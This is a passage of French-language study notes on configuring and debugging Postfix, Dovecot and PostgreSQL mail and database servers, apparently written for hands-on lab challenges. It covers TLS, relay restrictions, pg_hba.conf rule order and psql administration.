mydomain = local
myorigin = $mydomain
inet_interfaces = localhost
mydestination = $myhostname, localhost
mynetworks = 127.0.0.0/8
relayhost = [smtp.gmail.com]:587    # Relay via Gmail
```

**2. Serveur mail complet (Challenge 14) :**
```bash
myhostname = mail.stratos.xfusioncorp.com
mydomain = stratos.xfusioncorp.com
myorigin = $mydomain
inet_interfaces = all
inet_protocols = ipv4
mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain
mynetworks = 127.0.0.0/8, 10.0.0.0/24
home_mailbox = Maildir/
smtpd_sasl_auth_enable = yes    # SMTP-Auth actif
```

**3. Relay SMTP (forward emails autre serveur) :**
```bash
relayhost = [mail-relay.isp.com]:25
```

### Sécurité Postfix

**TLS/SSL (STARTTLS) :**

```bash
# Activer TLS
smtpd_use_tls = yes
smtpd_tls_cert_file = /etc/ssl/certs/mail.crt
smtpd_tls_key_file = /etc/ssl/private/mail.key
smtpd_tls_security_level = may    # may = optionnel | encrypt = obligatoire

# Client TLS (envoi emails externes)
smtp_use_tls = yes
smtp_tls_security_level = may
```

**Anti-spam measures :**

```bash
# Restreindre relay
smtpd_relay_restrictions =
  permit_mynetworks,
  permit_sasl_authenticated,
  reject_unauth_destination

# Rejeter emails mal formés
smtpd_helo_required = yes
strict_rfc821_envelopes = yes

# Rate limiting (anvil)
smtpd_client_connection_rate_limit = 10
smtpd_client_message_rate_limit = 20

# Blacklists DNS (RBL)
smtpd_recipient_restrictions =
  reject_rbl_client zen.spamhaus.org,
  reject_rbl_client bl.spamcop.net,
  permit
```

### Debugging Postfix

**Problème : Emails pas reçus** :
```bash
# 1. Vérifier Postfix actif
sudo systemctl status postfix

# 2. Vérifier queue
mailq

# 3. Vérifier logs erreurs
sudo tail -50 /var/log/maillog

# 4. Tester SMTP local
telnet localhost 25

# 5. Vérifier mydestination
postconf mydestination

# 6. Vérifier firewall port 25
sudo firewall-cmd --list-all
sudo ss -tuln | grep :25
```

**Problème : Emails queue bloqués (deferred)** :
```bash
# Vérifier logs raison defer
grep "deferred" /var/log/maillog

# Causes communes :
# - DNS destinataire pas résolu
# - Serveur destinataire offline
# - IP blacklistée (RBL)
# - Taille email trop grande
```

**Problème : Relay ouvert (open relay)** :
```bash
# DANGER : Serveur utilisé pour spam si relay ouvert
# TEST : Envoyer email externe → externe (pas mydestination)

telnet <server-ip> 25
MAIL FROM: <test@example.com>
RCPT TO: <external@gmail.com>    # Si accepté = relay ouvert !

# FIX : Vérifier smtpd_recipient_restrictions
postconf smtpd_recipient_restrictions
# Doit contenir reject_unauth_destination
```

### ⚠️ Pitfalls

1. **Relay ouvert** : `mydestination` trop large OU `smtpd_recipient_restrictions` mal configuré → source spam
2. **mydestination vs relay_domains** : Confondre domaines locaux (mydestination) et relay (relay_domains)
3. **inet_interfaces = all** sans firewall → Serveur SMTP exposé internet (spam)
4. **Oublier `home_mailbox`** → Emails stockés `/var/mail/user` (mbox) au lieu Maildir
5. **Port 25 bloqué FAI** : Nombreux FAI bloquent port 25 sortant → utiliser port 587 (submission)
6. **Certificat TLS expiré** : Clients refusent connexion si cert invalide
7. **mynetworks trop permissif** (`0.0.0.0/0`) → Relay ouvert

### Fichiers configuration Postfix

- `/etc/postfix/main.cf` : Configuration principale
- `/etc/postfix/master.cf` : Services Postfix (smtpd, pickup, cleanup, etc.)
- `/var/spool/postfix/` : Spool emails (queue)
- `/var/log/maillog` : Logs (RHEL) ou `/var/log/mail.log` (Debian)

---

## Module 30 : Dovecot - IMAP/POP3 Server (Challenge 14)

**Concepts :**
- **MDA (Mail Delivery Agent)** : Serveur accès boîtes mail (Dovecot, Courier)
- **IMAP (Internet Message Access Protocol)** : Protocole port 143 (emails restent serveur)
- **POP3 (Post Office Protocol v3)** : Protocole port 110 (télécharge emails localement)
- **Maildir** : Format stockage (un fichier par email)

### IMAP vs POP3

| Critère | IMAP | POP3 |
|---------|------|------|
| Port | 143 (993 SSL) | 110 (995 SSL) |
| Emails stockage | Serveur (sync multi-devices) | Local (téléchargés) |
| Gestion dossiers | Oui (INBOX, Sent, Trash, etc.) | Non (flat) |
| Bande passante | Plus élevée (sync constante) | Faible (download once) |
| Use case | Multi-devices (phone, laptop, web) | Single device, offline access |
| Recommandation | ✅ Moderne (privilégier) | ❌ Legacy (sauf offline requis) |

### Installation (Challenge 14)

```bash
# RHEL/CentOS/Rocky
sudo yum install dovecot -y

# Debian/Ubuntu
sudo apt install dovecot-core dovecot-imapd dovecot-pop3d -y

# Démarrer + activer boot
sudo systemctl enable --now dovecot

# Vérifier statut
sudo systemctl status dovecot
```

### Configuration Dovecot (Challenge 14)

**Fichiers config :** `/etc/dovecot/`

**1. `/etc/dovecot/dovecot.conf` (principal) :**

```bash
# Interfaces écoute (Challenge 14 line 30)
listen = *, ::
# * = IPv4, :: = IPv6

# Ou IPv4 uniquement
listen = *

# Protocols activés
protocols = imap pop3 lmtp
# imap = IMAP (recommandé)
# pop3 = POP3
# lmtp = Local Mail Transfer Protocol (livraison locale)
```

**2. `/etc/dovecot/conf.d/10-auth.conf` (authentification) :**

```bash
# Plain text auth (Challenge 14 line 10)
disable_plaintext_auth = no
# no = autorise auth plain (ATTENTION : utiliser avec TLS en prod)
# yes = force TLS avant auth

# Mécanismes authentification (Challenge 14 line 100)
auth_mechanisms = plain login
# plain = username + password (base64)
# login = legacy (compatibilité Outlook)
# cram-md5 = hash MD5 (plus sécurisé sans TLS)
```

**3. `/etc/dovecot/conf.d/10-mail.conf` (mailboxes) :**

```bash
# Emplacement mailboxes (Challenge 14 line 30)
mail_location = maildir:~/Maildir
# maildir:~/Maildir = Maildir dans home user (/home/user/Maildir/)
# mbox:~/mail = mbox format (legacy)
# maildir:/var/mail/%u/Maildir = centralisé
```

**4. `/etc/dovecot/conf.d/10-master.conf` (services) :**

```bash
# Socket UNIX Postfix SASL (Challenge 14 line 107-109)
service auth {
  unix_listener /var/spool/postfix/private/auth {
    mode = 0666
    user = postfix
    group = postfix
  }
}

# Explications :
# - Dovecot crée socket /var/spool/postfix/private/auth
# - Postfix utilise ce socket pour SMTP-Auth
# - Permissions 0666 = Postfix peut lire/écrire
# - user/group = postfix (ownership socket)
```

**5. `/etc/dovecot/conf.d/10-ssl.conf` (SSL/TLS) :**

```bash
# SSL required/optional (Challenge 14 line 8)
ssl = yes
# yes = TLS optionnel (STARTTLS disponible)
# required = TLS obligatoire (connexions plain text refusées)
# no = TLS désactivé (DANGEREUX en production)

# Certificats SSL
ssl_cert = </etc/ssl/certs/dovecot.crt
ssl_key = </etc/ssl/private/dovecot.key

# Protocoles TLS
ssl_min_protocol = TLSv1.2
ssl_cipher_list = HIGH:!aNULL:!MD5

# Préférer SSL server ciphers
ssl_prefer_server_ciphers = yes
```

### Commandes essentielles

```bash
# Vérifier configuration
doveconf -n
# Affiche directives non-default

# Lister toutes directives
doveconf

# Tester directive spécifique
doveconf mail_location
doveconf protocols

# Recharger configuration
sudo doveadm reload
sudo systemctl reload dovecot

# Redémarrer Dovecot
sudo systemctl restart dovecot
```

### Gestion users Dovecot

**Création user mail (Challenge 14) :**

```bash
# Créer user système (mailbox stockée /home/user/Maildir/)
sudo useradd -m siva
sudo passwd siva
# Password: 8FmzjvFU6S

# Dovecot utilise users système par défaut (/etc/passwd)
# Pas besoin config users Dovecot séparée
```

**Commandes doveadm (administration) :**

```bash
# Lister users
doveadm user '*'

# Infos user spécifique
doveadm user siva

# Tester authentification
doveadm auth test siva 8FmzjvFU6S
# Output : passdb: siva auth succeeded

# Lister mailboxes user
doveadm mailbox list -u siva

# Créer mailbox
doveadm mailbox create -u siva Sent
doveadm mailbox create -u siva Trash

# Supprimer emails
doveadm expunge -u siva mailbox INBOX all

# Statistiques user
doveadm quota get -u siva
```

### Tests IMAP/POP3

**Telnet IMAP (port 143) :**

```bash
telnet localhost 143

# Output :
# * OK [CAPABILITY ...] Dovecot ready.

# Commandes IMAP :
a1 LOGIN siva 8FmzjvFU6S
# a1 OK Logged in

a2 LIST "" "*"
# * LIST (\HasNoChildren) "." INBOX
# a2 OK List completed

a3 SELECT INBOX
# * FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
# a3 OK [READ-WRITE] Select completed

a4 LOGOUT
# * BYE Logging out
# a4 OK Logout completed
```

**Telnet POP3 (port 110) :**

```bash
telnet localhost 110

# Output :
# +OK Dovecot ready

# Commandes POP3 :
USER siva
# +OK

PASS 8FmzjvFU6S
# +OK Logged in

STAT
# +OK 2 320
# (2 messages, 320 octets total)

LIST
# +OK 2 messages
# 1 120
# 2 200

RETR 1
# +OK 120 octets
# (contenu email)

QUIT
# +OK Logging out
```

**Mail client (Thunderbird/Outlook config) :**

```
Incoming server (IMAP):
  Hostname: mail.srv.world
  Port: 143 (or 993 SSL)
  Username: siva
  Password: 8FmzjvFU6S
  Security: STARTTLS

Outgoing server (SMTP):
  Hostname: mail.srv.world
  Port: 587 (submission avec SMTP-Auth)
  Username: siva
  Password: 8FmzjvFU6S
  Security: STARTTLS
```

### Logs Dovecot

```bash
# Logs Dovecot (RHEL/CentOS)
sudo tail -f /var/log/dovecot.log
sudo tail -f /var/log/dovecot-info.log

# Logs journald
sudo journalctl -u dovecot -f

# Activer debug logging
sudo vi /etc/dovecot/conf.d/10-logging.conf

auth_debug = yes
mail_debug = yes

sudo systemctl restart dovecot
```

### Sécurité Dovecot

**TLS/SSL (obligatoire production) :**

```bash
ssl = required    # Force TLS (bloque plain text)
ssl_cert = </etc/letsencrypt/live/mail.example.com/fullchain.pem
ssl_key = </etc/letsencrypt/live/mail.example.com/privkey.pem
ssl_min_protocol = TLSv1.2
```

**Restreindre access IP :**

```bash
# /etc/dovecot/dovecot.conf
login_trusted_networks = 10.0.0.0/24 192.168.1.0/24
```

**Rate limiting (anti-bruteforce) :**

```bash
auth_policy_server_url = http://localhost:4001/
auth_policy_request_attributes = login=%{requested_username} pwhash=%{hashed_password}
```

### Use cases

**1. Serveur mail complet (Challenge 14) :**
- Postfix (MTA) : SMTP envoi/réception
- Dovecot (MDA) : IMAP/POP3 accès mailboxes
- SMTP-Auth : Postfix délègue auth à Dovecot (socket UNIX)

**2. Webmail backend :**
- Dovecot IMAP → Roundcube/SquirrelMail webmail

**3. Multi-domains :**
```bash
# Users virtuels (pas users système)
# Fichier /etc/dovecot/users
siva@domain1.com:{PLAIN}password1
alice@domain2.com:{PLAIN}password2

# Config passdb
passdb {
  driver = passwd-file
  args = /etc/dovecot/users
}
```

### Debugging Dovecot

**Problème : Authentification échoue** :
```bash
# 1. Tester auth manuellement
doveadm auth test siva 8FmzjvFU6S

# 2. Vérifier logs auth
sudo tail -50 /var/log/dovecot.log | grep auth

# 3. Activer debug auth
auth_debug = yes
sudo systemctl restart dovecot

# 4. Vérifier user existe
id siva

# 5. Vérifier permissions Maildir
ls -ld /home/siva/Maildir/
# Doit être owned par siva:siva
```

**Problème : Mailbox vide après login** :
```bash
# Vérifier mail_location
doveconf mail_location

# Vérifier Maildir existe
ls -la /home/siva/Maildir/

# Créer structure Maildir manuellement
mkdir -p /home/siva/Maildir/{cur,new,tmp}
chown -R siva:siva /home/siva/Maildir/
chmod -R 700 /home/siva/Maildir/
```

**Problème : Postfix SMTP-Auth échoue** :
```bash
# 1. Vérifier socket auth existe
ls -l /var/spool/postfix/private/auth

# 2. Vérifier permissions socket
# Doit être owned par postfix:postfix mode 0666

# 3. Vérifier Postfix config
postconf smtpd_sasl_type
postconf smtpd_sasl_path
# smtpd_sasl_path = private/auth

# 4. Tester SMTP-Auth
telnet localhost 25
EHLO test
# Doit afficher "250-AUTH PLAIN LOGIN"
```

### ⚠️ Pitfalls

1. **`disable_plaintext_auth = no` sans TLS** → Passwords transit clair (sniffing)
2. **Socket SASL permissions** : Mode différent 0666 OU user/group pas postfix → SMTP-Auth fail
3. **mail_location incorrect** → Dovecot cherche mailbox mauvais endroit
4. **Maildir permissions** : Pas owned par user → accès denied
5. **Protocols oubliés** : `protocols = imap` SANS `pop3` → POP3 indisponible
6. **SSL required** sans certificat valide → Clients refusent connexion
7. **Firewall ports** : 143 (IMAP) et 110 (POP3) fermés → connexion timeout

### Firewall ports mail

```bash
# Ouvrir ports Dovecot
sudo firewall-cmd --permanent --add-service=imap
sudo firewall-cmd --permanent --add-service=imaps
sudo firewall-cmd --permanent --add-service=pop3
sudo firewall-cmd --permanent --add-service=pop3s
sudo firewall-cmd --reload

# Ou ports manuels
sudo firewall-cmd --permanent --add-port=143/tcp    # IMAP
sudo firewall-cmd --permanent --add-port=993/tcp    # IMAPS
sudo firewall-cmd --permanent --add-port=110/tcp    # POP3
sudo firewall-cmd --permanent --add-port=995/tcp    # POP3S
sudo firewall-cmd --reload
```

### Fichiers configuration Dovecot

- `/etc/dovecot/dovecot.conf` : Config principale
- `/etc/dovecot/conf.d/` : Fichiers config modulaires
  * `10-auth.conf` : Authentification
  * `10-mail.conf` : Mailboxes location
  * `10-master.conf` : Services (IMAP, POP3, LMTP, auth sockets)
  * `10-ssl.conf` : TLS/SSL
  * `10-logging.conf` : Logs
- `/var/log/dovecot.log` : Logs Dovecot

---

## Module 31 : PostgreSQL - Database Server (Scenario 07)

**Concepts :**
- **PostgreSQL** : SGBD relationnel open source (alternative MySQL/MariaDB)
- **RDBMS** : Relational Database Management System (tables, SQL, ACID)
- **Daemon** : Service `postgresql` (port 5432 par défaut)
- **psql** : Client CLI PostgreSQL (équivalent `mysql` pour MySQL)

### PostgreSQL vs MySQL/MariaDB

| Critère | PostgreSQL | MySQL/MariaDB |
|---------|------------|---------------|
| Licence | PostgreSQL License (très permissive) | GPL (MariaDB) / Dual (MySQL) |
| Performance | Excellent queries complexes | Excellent lectures simples |
| Standards SQL | Conformité stricte SQL | Extensions propriétaires |
| JSON support | Native JSONB (performant) | JSON (moins performant) |
| Réplication | Streaming replication native | Master-slave native |
| Extensions | PostGIS (GIS), TimescaleDB, etc. | Moins d'extensions |
| Transactions | MVCC (Multi-Version Concurrency) | InnoDB MVCC |
| Use case | Analytics, data warehousing, GIS | Web apps, CMS (WordPress) |
| Complexité | Plus complexe (puissant) | Plus simple (débutants) |

### Installation PostgreSQL

```bash
# RHEL/CentOS/Rocky 8+
sudo dnf install postgresql-server postgresql-contrib -y

# Debian/Ubuntu
sudo apt install postgresql postgresql-contrib -y

# Initialiser cluster PostgreSQL (RHEL uniquement, 1x only)
sudo postgresql-setup --initdb
# Crée /var/lib/pgsql/data/ (PGDATA directory)

# Démarrer + activer boot
sudo systemctl enable --now postgresql

# Vérifier statut
sudo systemctl status postgresql

# Vérifier version
psql --version
# psql (PostgreSQL) 13.7

sudo -u postgres psql -c 'SELECT version();'
# PostgreSQL 13.7 on x86_64-pc-linux-gnu, compiled by gcc...
```

**Versions PostgreSQL courantes :**
- **PostgreSQL 13** : Stable, LTS (Debian 11, RHEL 8)
- **PostgreSQL 14** : Amélioration performances
- **PostgreSQL 15** : MERGE command, SQL standard
- **PostgreSQL 16** : Latest (2023, logical replication improvements)

### Architecture PostgreSQL

**Composants :**
```
Client (psql, app) → TCP/IP 5432 ou Socket UNIX → PostgreSQL Server (postmaster)
                                                        ↓
                                                   Databases
                                                   (postgres, app1, template1)
                                                        ↓
                                                   Tables, Indexes, Users
```

**Processus :**
- **postmaster** : Daemon principal (écoute connexions)
- **postgres** : Processus backend par connexion client
- **autovacuum** : Nettoyage automatique tables (VACUUM)
- **stats collector** : Collecte statistiques queries

**Filesystem PostgreSQL :**
- `/var/lib/pgsql/data/` (RHEL) ou `/var/lib/postgresql/<version>/main/` (Debian) : PGDATA
  * `postgresql.conf` : Config principale
  * `pg_hba.conf` : Host-Based Authentication (contrôle accès)
  * `pg_ident.conf` : User mapping (optionnel)
  * `base/` : Fichiers databases
  * `pg_wal/` : Write-Ahead Logs (transactions)
  * `pg_log/` ou `log/` : Logs PostgreSQL

### Configuration postgresql.conf (Scenario 07)

**Fichier :** `/etc/postgresql/13/main/postgresql.conf` (Debian) ou `/var/lib/pgsql/data/postgresql.conf` (RHEL)

**Directives essentielles :**

```bash
# ----- CONNEXIONS ET AUTHENTIFICATION -----

# Adresses IP écoute (Scenario 07 line ~60)
listen_addresses = 'localhost'
# localhost = écoute 127.0.0.1 + socket UNIX uniquement (défaut SECURE)
# '*' = écoute TOUTES interfaces (0.0.0.0 + ::)
# '10.0.1.5' = adresse IP spécifique
# '10.0.1.5,192.168.1.10' = multiples IPs
# '' (empty) = socket UNIX UNIQUEMENT (pas TCP/IP)

# ⚠️ CRITICAL (Scenario 07) :
# Par défaut listen_addresses COMMENTÉ → PostgreSQL écoute socket UNIX only
# Applications TCP/IP (127.0.0.1:5432) → Connection refused
# Solution : Décommenter + set 'localhost' (local TCP) ou '*' (remote TCP)

# Port TCP (ligne ~63)
port = 5432
# Défaut 5432 (standard PostgreSQL)
# Changer si conflit ou sécurité par obscurité

# Connexions simultanées max (ligne ~66)
max_connections = 100
# 100 = défaut (suffisant small/medium apps)
# Augmenter si nombreux clients (200-500 big apps)
# ATTENTION : Consomme RAM (shared_buffers + work_mem par connexion)

# Superuser reserved connections (ligne ~69)
superuser_reserved_connections = 3
# Connexions réservées superuser (admin maintenance si max_connections atteint)

# Socket UNIX directory (ligne ~71)
unix_socket_directories = '/var/run/postgresql'
# Emplacement socket UNIX : /var/run/postgresql/.s.PGSQL.5432
# Connexions locales (psql sans -h) utilisent socket UNIX (plus rapide + sécurisé)

# ----- MÉMOIRE -----

# Shared buffers (cache tables) (ligne ~120)
shared_buffers = 128MB
# Règle : 25% RAM serveur dédié PostgreSQL
# Exemple : 8GB RAM → shared_buffers = 2GB
# Max pratique : 8-16GB (au-delà rendements décroissants)

# Effective cache size (ligne ~134)
effective_cache_size = 4GB
# Estimation RAM totale disponible cache OS + PostgreSQL
# Règle : 75% RAM serveur dédié
# Exemple : 8GB RAM → effective_cache_size = 6GB
# N'alloue PAS mémoire (hint planner queries)

# Work memory (par opération sort/hash) (ligne ~137)
work_mem = 4MB
# Mémoire par opération sort/hash (ORDER BY, DISTINCT, JOIN hash)
# ATTENTION : Par opération, pas par connexion (query complexe = multiple work_mem)
# Calcul : (RAM - shared_buffers) / (max_connections * 2-3)
# Exemple : 8GB RAM, 100 connexions → work_mem = 10-20MB

# Maintenance work memory (VACUUM, CREATE INDEX) (ligne ~140)
maintenance_work_mem = 64MB
# Mémoire opérations maintenance (VACUUM, ANALYZE, CREATE INDEX, ALTER TABLE)
# Augmenter si grosses tables (256MB-1GB)

# ----- WRITE-AHEAD LOG (WAL) -----

# WAL level (ligne ~174)
wal_level = replica
# minimal = minimum (no replication, no archive)
# replica = streaming replication + archive (défaut PostgreSQL 10+)
# logical = logical replication (PostgreSQL 10+)

# WAL buffers (ligne ~184)
wal_buffers = 16MB
# Défaut -1 (auto = 1/32 shared_buffers, max 16MB)
# Augmenter si write-heavy workload (32-64MB)

# ----- LOGGING -----

# Log destination (ligne ~322)
logging_collector = on
# on = logs fichiers (pg_log/)
# off = logs stderr (systemd journal uniquement)

# Log directory (ligne ~325)
log_directory = 'log'
# Relatif PGDATA : /var/lib/pgsql/data/log/
# Absolu : /var/log/postgresql/

# Log filename pattern (ligne ~328)
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
# Rotation automatique logs

# Log rotation (ligne ~334)
log_rotation_age = 1d
log_rotation_size = 100MB
# Rotation quotidienne OU si fichier > 100MB

# Log timezone (ligne ~493)
log_timezone = 'Europe/Paris'

# Logging level (ligne ~343)
log_min_messages = warning
# debug5, debug1, info, notice, warning, error, log, fatal, panic
# Production : warning (défaut)
# Debug : info ou debug1

# Log connections/disconnections (ligne ~360)
log_connections = off
log_disconnections = off
# Activer pour audit connexions (verbose logs)

# Log duration queries (ligne ~374)
log_duration = off
log_min_duration_statement = -1
# -1 = désactivé
# 0 = logger TOUTES queries (très verbeux)
# 1000 = logger queries > 1 seconde (slow queries)

# Log line prefix (ligne ~382)
log_line_prefix = '%t [%p]: [%l-1] user=%u,db=%d,app=%a,client=%h '
# %t = timestamp, %p = PID, %u = user, %d = database, %h = client hostname/IP
# Exemple : 2024-01-13 10:30:45 CET [12345]: [1-1] user=app1user,db=app1,client=127.0.0.1

# ----- AUTOVACUUM (Nettoyage automatique) -----

# Autovacuum enabled (ligne ~457)
autovacuum = on
# on = VACUUM/ANALYZE automatique (ESSENTIEL production)
# off = manuel VACUUM requis (risque bloat tables)

# Autovacuum max workers (ligne ~460)
autovacuum_max_workers = 3
# Nombre processus autovacuum parallèles

# ----- LOCALE ET FORMAT -----

# Locale (ligne ~518)
lc_messages = 'en_US.UTF-8'
lc_monetary = 'en_US.UTF-8'
lc_numeric = 'en_US.UTF-8'
lc_time = 'en_US.UTF-8'
# Langue messages erreur, format monétaire/numérique/temps

# Default text search config (ligne ~523)
default_text_search_config = 'pg_catalog.english'
# Full-text search (indexation texte)

# Timezone (ligne ~526)
timezone = 'Europe/Paris'
# Timezone server (affecte NOW(), CURRENT_TIMESTAMP)

# Datestyle (ligne ~510)
datestyle = 'iso, mdy'
# iso = format ISO 8601 (YYYY-MM-DD)
# mdy = month-day-year (US) | dmy = day-month-year (Europe)
```

**⚠️ CRITICAL Scenario 07 :**
```bash
# Problème : Application cannot connect PostgreSQL (connection refused)
# Symptôme : psql -h 127.0.0.1 échoue MAIS psql (sans -h) OK
# Root cause : listen_addresses COMMENTÉ ou = '' (socket UNIX only)

# Solution :
sudo vi /etc/postgresql/13/main/postgresql.conf

# Chercher ligne (Ctrl+/ dans vi : /listen_addresses)
#listen_addresses = 'localhost'    # ← COMMENTÉ (défaut)

# Décommenter + vérifier valeur :
listen_addresses = '*'              # Toutes interfaces (local + remote)
# ou
listen_addresses = 'localhost'      # Local only (127.0.0.1 + ::1)

# Reload config (sans redémarrer)
sudo systemctl reload postgresql
# reload = recharge config SANS couper connexions actives (0 downtime)
# restart = redémarre service (coupe connexions actives)

# Vérifier PostgreSQL écoute TCP
sudo ss -tuln | grep 5432
# tcp   LISTEN   0.0.0.0:5432      (listen_addresses = '*')
# tcp   127.0.0.1:5432             (listen_addresses = 'localhost')
```

### Configuration pg_hba.conf (Host-Based Authentication - Scenario 07)

**Fichier :** `/etc/postgresql/13/main/pg_hba.conf` (Debian) ou `/var/lib/pgsql/data/pg_hba.conf` (RHEL)

**Rôle :** Contrôler QUI peut se connecter (users, hosts, databases, méthodes auth)

**Syntaxe règles :**
```
TYPE    DATABASE    USER    ADDRESS         METHOD
```

**Champs :**
- **TYPE** : `local` (socket UNIX) | `host` (TCP/IP) | `hostssl` (SSL requis) | `hostnossl` (pas SSL)
- **DATABASE** : Nom database (`all`, `postgres`, `app1`, etc.)
- **USER** : Nom user (`all`, `postgres`, `app1user`, etc.)
- **ADDRESS** : Réseau CIDR (`127.0.0.1/32`, `0.0.0.0/0`, `10.0.0.0/24`) - UNIQUEMENT pour type `host`
- **METHOD** : Méthode authentification (voir ci-dessous)

**Méthodes authentification courantes :**

| METHOD | Description | Use case | Sécurité |
|--------|-------------|----------|----------|
| `trust` | Pas de password (accès direct) | Développement local | ❌ DANGEREUX production |
| `peer` | User UNIX = user PostgreSQL (socket UNIX) | Connexions locales admin | ✅ Sécurisé local |
| `md5` | Password hash MD5 | Legacy (compatibilité) | ⚠️ MD5 deprecated (faible) |
| `scram-sha-256` | Password hash SCRAM-SHA-256 | **Recommandé production** | ✅ Fort (PostgreSQL 10+) |
| `password` | Password plain text (⚠️) | JAMAIS (transmission claire) | ❌ TRÈS DANGEREUX |
| `reject` | Bloquer connexion explicitement | Blacklist users/networks | ✅ Sécurité |
| `cert` | Certificat SSL client | Authentification certificat | ✅ Très sécurisé |

**Exemples règles pg_hba.conf :**

```bash
# ===== CONNEXIONS LOCALES (socket UNIX) =====

# User postgres (superuser) local via peer auth (défaut sécurisé)
local   all             postgres                                peer

# Tous users locaux via socket UNIX (peer auth)
local   all             all                                     peer

# Tous users locaux via socket UNIX (password auth md5)
local   all             all                                     md5

# ===== CONNEXIONS TCP/IP (localhost 127.0.0.1) =====

# Localhost IPv4 tous users + databases (password required)
host    all             all             127.0.0.1/32            scram-sha-256

# Localhost IPv6 tous users + databases
host    all             all             ::1/128                 scram-sha-256

# ===== CONNEXIONS TCP/IP REMOTE =====

# Réseau local 10.0.0.0/24 (tous users + databases)
host    all             all             10.0.0.0/24             scram-sha-256

# Réseau 192.168.1.0/24 (database app1 uniquement, user app1user)
host    app1            app1user        192.168.1.0/24          scram-sha-256

# Toutes IPs (⚠️ DANGEREUX - ouvrir internet)
host    all             all             0.0.0.0/0               scram-sha-256

# ===== BLACKLIST (REJECT explicite) =====

# Bloquer user spécifique
host    all             baduser         0.0.0.0/0               reject

# Bloquer réseau spécifique (Scenario 07 problème)
host    all             all             all                     reject
# ⚠️ BLOQUE TOUT (règle "catch-all" fin fichier = deny all)

# ===== SSL REQUIS =====

# Connexions SSL obligatoire
hostssl all             all             0.0.0.0/0               scram-sha-256

# Connexions sans SSL bloquées
hostnossl all           all             0.0.0.0/0               reject
```

**⚠️ ORDRE RÈGLES CRITIQUE (Scenario 07) :**

```bash
# pg_hba.conf lu TOP → BOTTOM
# PREMIÈRE règle match = appliquée (PAS de cascade)

# EXEMPLE PROBLÉMATIQUE (Scenario 07) :
# ----- BAD CONFIG -----
host    all             all             all                     reject    # ← ligne 1
host    all             all             127.0.0.1/32            md5       # ← ligne 2

# Résultat : TOUTES connexions TCP refusées (ligne 1 match AVANT ligne 2)
# Connexion 127.0.0.1 → match ligne 1 "all" → REJECT (ligne 2 jamais évaluée)

# ----- GOOD CONFIG -----
host    all             all             127.0.0.1/32            md5       # ← ligne 1 SPÉCIFIQUE
host    all             all             all                     reject    # ← ligne 2 GÉNÉRIQUE

# Résultat : 127.0.0.1 autorisé (ligne 1), reste refusé (ligne 2)
# Règle : TOUJOURS règles SPÉCIFIQUES avant règles GÉNÉRIQUES

# ----- Scenario 07 FIX -----
# Avant (broken) :
host    all             all             all                     reject    # Bloque TOUT
host    all             all             127.0.0.1/32            md5

# Après (fixed) :
# host    all             all             all                     reject    # ← SUPPRIMER/COMMENTER
host    all             all             127.0.0.1/32            md5       # ← Autoriser localhost

# OU simplement supprimer ligne reject (si pas besoin blacklist)
```

**Configuration pg_hba.conf typique production :**

```bash
# TYPE  DATABASE        USER            ADDRESS                 METHOD

# Connexions locales socket UNIX (admin postgres)
local   all             postgres                                peer
local   all             all                                     peer

# Localhost IPv4 (applications local server)
host    all             all             127.0.0.1/32            scram-sha-256

# Localhost IPv6
host    all             all             ::1/128                 scram-sha-256

# Réseau local application servers (ex : 10.0.1.0/24)
host    all             all             10.0.1.0/24             scram-sha-256

# Bloquer tout le reste (sécurité)
host    all             all             0.0.0.0/0               reject

# ⚠️ JAMAIS mettre "trust" ou "0.0.0.0/0 md5" en production (ouvre base internet)
```

### Commandes PostgreSQL essentielles

**Connexion psql :**

```bash
# Connexion socket UNIX (local, user postgres)
sudo -u postgres psql
# Peer auth : user UNIX postgres → user PostgreSQL postgres (pas password)

# Connexion TCP/IP localhost (password required)
psql -h 127.0.0.1 -d postgres -U postgres
# Demande password (md5/scram-sha-256 auth)

# Connexion database + user spécifiques
psql -h 127.0.0.1 -d app1 -U app1user

# Connexion avec password envvar (scripts)
PGPASSWORD='mypassword' psql -h 127.0.0.1 -d app1 -U app1user

# Connexion + exécuter query + quitter
psql -h 127.0.0.1 -d app1 -U app1user -c 'SELECT version();'
psql -h 127.0.0.1 -d app1 -U app1user -c '\q'    # Test connexion (Scenario 07)

# Connexion remote server
psql -h 192.168.1.100 -p 5432 -d mydb -U myuser
```

**Commandes psql interactives :**

```bash
# Lister databases
\l
\list

# Connecter database
\c database_name
\connect app1

# Lister tables database courante
\dt
\dt+    # Détails (taille tables)

# Décrire table (structure colonnes)
\d table_name
\d+ table_name    # Détails (indexes, contraintes)

# Lister users (roles)
\du
\du+

# Lister schemas
\dn

# Afficher connexion courante
\conninfo
# You are connected to database "app1" as user "app1user" via socket in "/var/run/postgresql" at port "5432".

# Quitter psql
\q
exit
```

**Gestion users (roles) :**

```bash
# Créer user (superuser)
sudo -u postgres createuser --superuser admin

# Créer user standard (password)
sudo -u postgres psql
CREATE USER app1user WITH PASSWORD 'SecurePass123';

# Créer user + database ownership
CREATE USER myuser WITH PASSWORD 'pass';
CREATE DATABASE mydb OWNER myuser;

# Modifier password user
ALTER USER app1user WITH PASSWORD 'NewPassword456';

# Donner privilèges
GRANT ALL PRIVILEGES ON DATABASE app1 TO app1user;
GRANT SELECT, INSERT, UPDATE ON TABLE mytable TO app1user;

# Révoquer privilèges
REVOKE ALL PRIVILEGES ON DATABASE app1 FROM app1user;

# Supprimer user
DROP USER app1user;
# ERREUR si user own objects → d'abord reassign/drop objects

# Lister users
\du
SELECT usename, usecreatedb, usesuper FROM pg_user;

# Supprimer user CLI
sudo -u postgres dropuser app1user
```

**Gestion databases :**

```bash
# Créer database
sudo -u postgres createdb app1

# Créer database + owner
sudo -u postgres createdb app1 -O app1user

# Créer database psql
sudo -u postgres psql
CREATE DATABASE app1 OWNER app1user;

# Supprimer database
sudo -u postgres dropdb app1

# Supprimer database psql
DROP DATABASE app1;

# Lister databases
sudo -u postgres psql -c '\l'
SELECT datname FROM pg_database;

# Voir taille database
SELECT pg_size_pretty(pg_database_size('app1'));

# Renommer database
ALTER DATABASE oldname RENAME TO newname;
```

**systemctl management :**

```bash
# Démarrer PostgreSQL
sudo systemctl start postgresql

# Arrêter PostgreSQL
sudo systemctl stop postgresql

# Redémarrer PostgreSQL (COUPE connexions actives)
sudo systemctl restart postgresql
# ⚠️ Downtime : Connexions actives terminées brutalement
# Use case : Modif listen_addresses, port, shared_buffers (require restart)

# Recharger configuration (0 downtime - Scenario 07)
sudo systemctl reload postgresql
